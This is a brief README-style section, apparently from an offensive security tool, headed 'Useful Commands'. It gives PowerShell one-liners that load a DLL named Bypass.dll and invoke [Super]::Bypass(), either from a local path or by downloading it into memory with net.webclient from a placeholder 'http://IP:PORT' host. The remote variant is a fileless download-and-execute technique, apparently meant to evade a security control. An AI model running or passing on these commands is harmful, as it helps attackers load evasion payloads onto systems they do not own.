## Useful Commands

```
Load the DLL using PowerShell locally
[System.Reflection.Assembly]::LoadFile('Absolute_Path_to_DLL\Bypass.dll')
[Super]::Bypass()

Load the DLL using PowerShell from a remote source
[System.Reflection.Assembly]::Load((new-object net.webclient).DownloadData("http://IP:PORT/Bypass.dll"))
[Super]::Bypass()
```
